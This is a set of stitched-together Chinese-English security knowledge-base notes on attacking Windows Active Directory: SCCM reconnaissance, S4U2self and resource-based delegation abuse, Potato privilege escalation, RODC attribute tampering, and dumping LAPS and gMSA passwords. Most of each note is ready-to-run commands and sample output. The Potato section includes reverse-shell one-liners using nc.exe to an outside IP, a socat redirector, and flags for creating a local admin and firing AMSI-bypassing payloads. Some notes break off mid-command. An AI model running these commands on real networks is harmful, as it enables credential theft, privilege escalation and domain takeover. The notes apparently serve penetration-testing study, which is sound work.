SCCM Attack Surface Overview SCCM 侦察 can be performed in many ways. The goal is to enumerate whether SCCM is present in a target network, and which are the assets related to it. In this case a PXE server was found and PXE media was downloaded. The location of the PXE media on the TFTP server is \SMSTemp..., which indicates that this is indeed an SCCM server. the SMB signing status (useful to perform later NTLM 中继 attacks) Using LDAP queries from a domain-joined Windows machine: # 命令 / 载荷 / 操作片段 # 1. 侦察 12345# Find the assets in the LDAP configurationsccmhunter.py find -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC# Retrieve informations regarding the identified servers and save PXE variablessccmhunter.py smb -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC -save # 2. 侦察 1234567891011# View the SMB configurations and running servicessccmhunter.py show -smb# View the userssccmhunter.py show -user# View the serverssccmhunter.py show -computers# View everythingsccmhunter.py show -all # 3. 侦察 12# LDAP search via PS(ADSISearcher).FindAll() | % {$_.Properties} # 4. 侦察 12345# WMIGet-WmiObject -Class SMS_Authority -Namespace root\CCM# SharmSCCPSharpSCCM.exe local site-info # 工具与参考入口 Primary Site Server Secondary Sites Passive Site Server Management Point (MP) Distribution Point (DP) Site Database Server SMS Provider Central Administration Site (CAS) Boundary Groups automatic site assignment feature pxethiefy.py PXEThief sccmhunter SharpSCCM https://enigma0x3.net/2016/02/ https://blog.xpnsec.com/unobfuscating-network-access-accounts/ https://posts.specterops.io/coercing-ntlm - 认证 - from-sccm-e6e23ea8260a https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/S4U2self abuse 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # S4U2self abuse 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 S4U2self abuse 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 S4U2self abuse 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：S4U2self abuse、Theory、Delegation and extensions、Microsoft Virtual Accounts、OPSEC considerations；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 S4U2self abuse Theory Delegation and extensions Microsoft Virtual Accounts OPSEC considerations Practice Machine account's TGT Obtain a Service Ticket # 核心要点 The following recipe shows how to abuse S4U2self for Local 权限提升，or for stealthier alternative to 白银票据. There are other tricks based on S4U2self, using u2u (user-to-user) as well. Kerberos delegations allow services to access other services on behalf of domain users. Simply put, Service for User to Self (S4U2self) allows a service to obtain a Service Ticket, on behalf of a user (called "principal"), to itself. This step revolves around the tgtdeleg feature from Rubeus which allows an attacker that has code execution on a machine to ask a TGT, which will be the machine account's TGT (cf. Microsoft Virtual Accounts). The TGT can then be used with 票据传递 for the next step, which can be conducted remotely if needed, unlike this initial step. Alternatively, if the machine account 凭据 are known, a TGT can be requested commonly. # 命令 / 载荷 / 操作片段 # 1. Practice 1Rubeus.exe tgtdeleg /nowrap # 2. Machine account's TGT 1getTGT.py -dc-ip "$DC_IP" -hashes :"$NT_HASH" "$DOMAIN"/"machine$" # 3. Machine account's TGT 1Rubeus.exe asktgt /nowrap /domain:"domain" /user:"computer$" /rc4:"NThash" # 4. Obtain a Service Ticket 12export KRB5CCNAME="/path/to/ticket.ccache"getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no-pass -dc-ip "DomainController" "domain.local"/'machine$' # 5. Obtain a Service Ticket 1Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /altservice:"cifs/machine.domain.local" /ticket:"base64ticket" # 工具与参考入口 Rubeus Impacket getTGT.py https:// 利用.ph/delegate-2-thyself.html https:// 利用.ph/revisiting-delegate-2-thyself.html # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Kerberos 票据攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

来源路径： 02-知识点/域与Windows/RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato、Requirements and common gotchas、Quick Demo、PrintSpoofer、RoguePotato；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 13 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato Requirements and common gotchas Quick Demo PrintSpoofer RoguePotato PrintNotifyPotato SharpEfsPotato EfsPotato GodPotato DCOMPotato SigmaPotato (updated GodPotato fork) DeadPotato (2024 GodPotato rework with modules) # 核心要点 privilege-escalation-abusing-tokens.md All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges: SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege High integrity is not required if the 令牌 already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.) Check privileges quickly: If your shell runs under a restricted 令牌 lacking SeImpersonatePrivilege (common for Local Service/Network Service in some contexts), regain the account’s default privileges using FullPowers, then run a Potato. Example: FullPowers.exe -c "cmd /c whoami /priv" -z “Kitchen-sink” forks such as DeadPotato bundle extra 载荷 modules (Mimikatz/SharpHound/Defender off) which touch disk; expect higher EDR 检测 compared to the slim originals. Requires the calling context to hold SeImpersonatePrivilege (typical for IIS APPPOOL, MSSQL, and scheduled-task service accounts). Works across Windows 8/8.1–11 and Server 2012–2022 when SeImpersonatePrivilege is present. If your initial execution primitive is a webshell/UI with short timeouts, stage the 载荷 as a script and ask GodPotato to run it instead of a long inline command. Built-in 反弹 Shell flag --revshell and removal of the 1024-char PowerShell limit so you can fire long AMSI-bypassing 载荷 in one go. Separate SigmaPotatoCore.exe compiled against .NET 2.0 for PowerShell Core environments. -rev ip:port — quick 反弹 Shell. -newadmin user:pass — create a local admin for 持久化. # 命令 / 载荷 / 操作片段 # 1. Requirements and common gotchas 1whoami /priv | findstr /i impersonate # 2. PrintSpoofer 1234567891011c:\PrintSpoofer.exe -c "c:	ools
c.exe 10.10.10.10 443 -e cmd"--------------------------------------------------------------------------------[+] Found privilege: SeImpersonatePrivilege[+] Named pipe listening...[+] CreateProcessAsUser() OKNULL # 3. RoguePotato 123c:\RoguePotato.exe -r 10.10.10.10 -c "c:	ools
c.exe 10.10.10.10 443 -e cmd" -l 9999# In some old versions you need to use the "-f" paramc:\RoguePotato.exe -r 10.10.10.10 -c "c:	ools
c.exe 10.10.10.10 443 -e cmd" -f 9999 # 4. RoguePotato 12345# On attacker redirector (must listen on TCP/135 and forward to victim:9999)socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IPRoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999 # 5. PrintNotifyPotato 12PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1" PrintNotifyPotato.exe whoami # 6. SharpEfsPotato 12345678910111213141516> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:	emp\w.log"SharpEfsPotato by @bugch3ck Local privilege escalation from SeImpersonatePrivilege using EfsRpc. Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.[+] Triggering name pipe access on evil PIPE \localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:[x]RpcBindingSetAuthInfo failed with status 0x6d3[+] Server connected to our evil RPC pipe[+] Duplicated impersonation token ready for process creation[+] Intercepted and authenticated successfully, launching program[+] Process created, enjoy!C:	emp>type C:	emp\w.lognt authority\system # 7. EfsPotato 1234567891011121314> EfsPotato.exe "whoami"Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).Part of GMH's fuck Tools, Code By zcgonvh.CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net][+]

content: 来源路径： 02-知识点/域与Windows/Rights on RODC object 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Rights on RODC object 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Rights on RODC object 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Rights on RODC object 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Rights on RODC object；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Rights on RODC object # 核心要点 For more granularity, one of these ACEs against the RODC object is initially sufficient, since they will implicitly allow WriteProperty against the msDS-RevealOnDemandGroup and msDS-NeverRevealGroup attributes: WriteDacl (the attacker can modify the DACL and obtain arbitrary permissions) Owns (c.f. WriteDacl) WriteOwner (i.e. the attacker can obtain Owns -> WriteDacl -> other permissions) WriteProperty against the msDS-RevealOnDemandGroupattribute in conjunction with another primitive to gain privileged access to the host. WriteProperty against the msDS-NeverRevealGroup attribute may be required if it includes the target account. From UNIX-like systems, this PowerView python package (Python) can be used to modify the LDAP attribute. # 命令 / 载荷 / 操作片段 # 1. Rights on RODC object 1powerview "$DOMAIN"/"$USER":"$PASSWORD"@"RODC_FQDN" # 2. Rights on RODC object 1234567#First, add a domain admin account to the msDS-RevealOnDemandGroup attribute#Then, append the Allowed RODC Password Replication Group groupSet-DomainObject -Identity RODC-server$ -Set msDS-RevealOnDemandGroup='CN=Administrator,CN=Users,DC=domain,DC=local'Set-DomainObject -Identity RODC-server$ -Append msDS-RevealOnDemandGroup='CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local'#If needed, remove the admin from the msDS-NeverRevealGroup attributeSet-DomainObject -Identity RODC-server$ -Clear msDS-NeverRevealGroup # 3. Rights on RODC object 12345678910# Get original msDS-RevealOnDemandGroup valuesbloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object 'RODC-server$' --attr msDS-RevealOnDemandGroupdistinguishedName: CN=RODC,CN=Computers,DC=domain,DC=localmsDS-RevealOnDemandGroup: CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local# Add the previous value plus the admin accountbloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'#If needed, remove the admin from the msDS-NeverRevealGroup attributebloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-NeverRevealGroup # 4. Rights on RODC object 12345#First, add a domain admin account to the msDS-RevealOnDemandGroup attributeSet-DomainObject -Identity RODC-Server$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}#If needed, remove the admin from the msDS-NeverRevealGroup attributeSet-DomainObject -Identity RODC-Server$ -Clear 'msDS-NeverRevealGroup' # 工具与参考入口 PowerView python package bloodyAD PowerView # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: Resource-based 约束委派
content: 来源路径： 02-知识点/域与Windows/Resource-based 约束委派.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Resource-based 约束委派 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Resource-based 约束委派 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Resource-based 约束委派 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Basics of Resource-based 约束委派、New Concepts、Attack structure、Attack、Creating a Computer Object；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 16 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Basics of Resource-based 约束委派 New Concepts Attack structure Attack Creating a Computer Object Configuring Resource-based 约束委派 Performing a complete S4U attack (Windows/Rubeus) Linux tooling: end-to-end RBCD with Impacket (2024+) Cross-domain & cross-forest RBCD Cross-domain RBCD: configure the foreign principal by SID Cross-domain RBCD: cross-realm S4U sequence Cross-domain RBCD from Linux Cross-forest RBCD limitations Cross-forest RBCD protocol quirks Cross-forest RBCD from Linux 检测 /hardening notes Accessing Abuse different service tickets # 核心要点 However, if the TGS used in S4U2Proxy is NOT Forwardable trying to abuse a basic Constrain Delegation it won't work. But if you are trying to 利用 a Resource-Based constrain delegation, it will work. If you have write equivalent privileges over a Computer account you can obtain privileged access in that machine. Suppose that the attacker has already write equivalent privileges over the victim computer. The attacker abuses its WRITE privilege over the victim computer (ServiceB) to configure resource-based 约束委派 to allow ServiceA to impersonate any user against that victim computer (ServiceB). The attacker uses Rubeus to perform a full S4U attack (S4U2Self and S4U2Proxy) from Service A to Service B for a user with privileged access to Service B. Even if you are using a not Forwardable TGS, as you are exploiting Resource-based 约束委派，it will work. Using activedirectory PowerShell module If LDAP signing/LDAPS is enforced, use impacket-rbcd -use-ldaps .... Impacket can rewrite the sname ("AnySPN") for some 工具，but obtain the correct SPN whenever possible (e.g., CIFS/LDAP/HTTP/HOST/MSSQLSvc). --sid tells ntlmrelayx.py to treat --escalate-user as a SID, which is required when the delegating account is foreign to the target domain. Even if the tool prints User not found in LDAP, the delegation write can still succeed because the security descriptor stores the foreign SID directly. the delegating forest user is a local admin (or otherwise privileged) on the resource host in the other forest RBCD paths across domains/forests are still usually created through ACL abuse or relay-to-LDAP. Enforce LDAP signing and LDAP channel binding on DCs to break common setup paths. Audit who can write msDS-AllowedToActOnBehalfOfOtherIdentity on computer objects and resolve the stored SIDs, including foreign security principals. # 命令 / 载荷 / 操作片段 # 1. Attack structure 1Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota # 2. Creating a Computer Object 12345import-module powermadNew-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose# Check if createdGet-DomainComputer SERVICEA # 3. Configuring Resource-based 约束委派 12Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privilegesGet-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked # 4. Configuring Resource-based 约束委派 123456789101112$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"$SDBytes = New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0)Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}#Check that it workedGet-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'msds-allowedtoactonbehalfofotheridentity----------------------------------------{1, 0, 4, 128...} # 5. Performing a complete S4U attack (Windows/Rubeus) 1.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local # 6. Performing a complete S4U attack (Windows/Rubeus) 1rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt # 7. Performing a complete S4U attack (Windows/Rubeus) 1rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsma

title: ReadLAPSPassword 技术笔记
content: 来源路径： 02-知识点/域与Windows/ReadLAPSPassword 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # ReadLAPSPassword 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 ReadLAPSPassword 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 ReadLAPSPassword 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：ReadLAPSPassword；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 ReadLAPSPassword # 核心要点 From UNIX-like systems, pyLAPS (Python) can be used to retrieve LAPS passwords. Impacket's ntlmrelayx also carries that feature, usable with the --dump-laps. This can be achieved with the Active Directory 域 PowerShell module. The PowerView powershell module from PowerSploit can also be used for that purpose. Also, the Invoke-PassTheCert fork can be used, authenticating through Schannel via PassTheCert (PowerShell version). Note: the README contains the 方法论 to request a certificate using certreq from Windows (with a 密码，or an NTHash). # 命令 / 载荷 / 操作片段 # 1. ReadLAPSPassword 1pyLAPS.py --action get -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC_IP" # 2. ReadLAPSPassword 12345# Default commandnxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --module laps# The COMPUTER filter can be the name or wildcard (e.g. WIN-S10, WIN-* etc. Default: *)nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --module laps -O computer="target-*" # 3. ReadLAPSPassword 1bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime # 4. ReadLAPSPassword 1Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime' # 5. ReadLAPSPassword 1Get-DomainComputer "MachineName" -Properties 'cn','ms-mcs-admpwd','ms-mcs-admpwdexpirationtime' # 6. ReadLAPSPassword 1SharpLAPS.exe /user:"DOMAIN\User" /pass:"Password" /host:"192.168.1.1" # 7. ReadLAPSPassword 12345678910111213# Import the PowerShell script and show its manualImport-Module .\Invoke-PassTheCert.ps1.\Invoke-PassTheCert.ps1 -?# Authenticate to LDAP/S$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx# List all the available actionsInvoke-PassTheCert -a -NoBanner# Returns all readable LAPS Passwords in the 'ADLAB.LOCAL' Domain (method 1)Invoke-PassTheCert -Action 'Filter' -LdapConnection $LdapConnection -SearchBase 'DC=ADLAB,DC=LOCAL' -SearchScope 'Subtree' -Properties '*' -LDAPFilter '(|(ms-Mcs-AdmPwd=*)(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-PasswordExpirationTime=*))'# Returns all readable LAPS Passwords in the 'ADLAB.LOCAL' Domain (method 2, same as method 1)Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'LAPS' -SearchBase 'DC=ADLAB,DC=LOCAL' # 工具与参考入口 pyLAPS NetExec this public module LAPSDumper bloodyAD PowerView SharpLAPS Invoke-PassTheCert PassTheCert README certreq https://simondotsh.com/infosec/2022/07/11/dirsync.html # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/ReadGMSAPassword 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # ReadGMSAPassword 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 ReadGMSAPassword 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 ReadGMSAPassword 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：ReadGMSAPassword；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 8 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 ReadGMSAPassword # 核心要点 The attacker can then read the gMSA (group managed service accounts) 密码 of the account if those requirements are met. On UNIX-like systems, gMSADumper (Python) can be used to read and decode gMSA passwords. It supports cleartext NTLM, 哈希传递 and Kerberoas authentications. Alternative 1: Impacket's ntlmrelayx (Python) tool can be used to read and decode gMSA passwords. ⚠️ Some tests showed ntlmrelayx missed entries gMSADumper didn't. In order to easily fake a relayed 认证，once the relay servers are up and running, the tester can browse http://127.0.0.1/in order to trigger a basic 认证 that will then be relayed by ntlmrelayx, like this. Alternative 2: The msDS-ManagedPassword attribute can also be manually obtained by running the following Python script. The following Python code can then be used to decode the blob. On Windows systems, there are multiple ways to read gMSA passwords. # 命令 / 载荷 / 操作片段 # 1. ReadGMSAPassword 1gMSADumper.py -u 'user' -p 'password' -d 'domain.local' # 2. ReadGMSAPassword 1ntlmrelayx.py -t ldaps://10.0.0.5 -debug --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs # 3. ReadGMSAPassword 1234567891011import ldap3target_dn = "" # something like 'CN=Target User,OU=Standard Accounts,DC=domain,DC=local'domain = "domain"username = "username"user = "{}\\{}".format(domain, username)password = "password"server = ldap3.Server(domain)connection = ldap3.Connection(server = server, user = user, password = password, authentication = ldap3.NTLM)connection.bind()connection.search(target_dn, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=ldap3.SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])print(connection.entries) # 4. ReadGMSAPassword 1bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object $TargetObject --attr msDS-ManagedPassword # 5. ReadGMSAPassword 1ldeep ldap -d "$DOMAIN" -s "$DC_IP" -u "$USER" -p "$PASSWORD" gmsa -t $TargetObject # 6. ReadGMSAPassword 12345678910# Save the blob to a variable$gmsa = Get-ADServiceAccount -Identity 'Target_Account' -Properties 'msDS-ManagedPassword'$mp = $gmsa.'msDS-ManagedPassword'# Decode the data structure using the DSInternals moduleConvertFrom-ADManagedPasswordBlob $mp# Build a NT-Hash for PTH(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash# Alterantive: build a Credential-Object with the Plain Password$cred = new-object system.management.automation.PSCredential "Domain\Target_Account",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword # 7. ReadGMSAPassword 1.\GMSAPasswordReader.exe --AccountName 'Target_Account' # 8. ReadGMSAPassword 123456789# Import the PowerShell script and show its manualImport-Module .\Invoke-PassTheCert.ps1.\Invoke-PassTheCert.ps1 -?# Authenticate to LDAP/S$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx# List all the available actionsInvoke-PassTheCert -a -NoBanner# Read the ManagedPassword-related attributes (NTHash included) of the 'gmsad$' Group Managed Service Account (not specifying -Object allows to retrieve every gMSAs' NTHashes the certificate account has access to).Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'gMSA' -Object 'CN=gmsad,CN=Managed Service Accounts,DC=X' # 工具与参考入口 gMSADumper ntlmrelayx http://127.0.0.1/ this following Python code bloodyAD ldeep GMSAPasswordReader Invoke-PassTheCert PassTheCert README certreq https://cube0x0.github.io/Relaying-for-gMSA/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/Read-Only Domain Controller 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Read-Only Domain Controller 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Read-Only Domain Controller 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Read-Only Domain Controller 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：RODC、Theory、RODC Management、认证 with an RODC、Practice；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页当前以概念和流程为主；后续实验时可补充最小复现命令和输出样例。 # 关键主题 RODC Theory RODC Management 认证 with an RODC Practice # 核心要点 The read-only Domain Controller (RODC) is a solution that Microsoft introduced for physical locations that don’t have adequate security to host a Domain Controller but still require directory services for resources in those locations. A branch office is the classic use case. RODC holds a read-only filtered copy of the Active Directory 域 database with all the sensitives attributes deleted, like the LAPS passwords (this refers to RODC Filtered Attribute Set#rodc-fas) (FAS)), and cache only specific 凭据. The default PRP (密码 Replication Policy) specifies that no account passwords can be cached on any RODC, and certain accounts are explicitly denied from being cached on any RODC.\ (Microsoft#credential-caching)) The RODC computer account has reset rights on the account krbtgt XXXXX's 密码. Several attacks can be performed on RODCs: RODC 黄金票据 Exploiting control over a RODC computer object # 工具与参考入口 specterops.io [RODC Filtered Attribute Set](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753459(v=ws.10) msDS-RevealOnDemandGroup msDS-NeverRevealGroup msDS-Revealed-List [密码 Replication Policy](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/cc730883(v=ws.10) https://adsecurity.org/?p=3592 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 